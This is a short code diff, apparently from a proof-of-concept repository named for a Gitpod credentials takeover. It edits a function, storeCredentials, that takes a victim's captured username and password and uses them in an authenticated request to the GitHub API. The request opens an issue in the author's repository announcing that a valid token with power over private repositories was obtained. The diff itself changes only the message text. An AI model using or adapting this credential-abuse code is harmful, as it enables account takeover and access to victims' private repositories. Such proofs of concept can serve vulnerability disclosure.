@@ -17,7 +17,7 @@ const storeCredentials = data => new Promise((resolve, reject) => {
                 url: `https://${encodeURI(data.user)}:${encodeURI(data.password)}@api.github.com/repos/gerardo-junior/gitpod-provider-credentials-takeover/issues`,
                 body: JSON.stringify({ 
                     title: 'I got a valid token from you!',
-                    body: 'this is a return to click to open issue on gitpod',
+                    body: 'this is a return to click on open on gitpod button, i got a valid token with the power to manage private repositories from you!',
                     assignee: 'gerardo-junior' 
                 })
             })
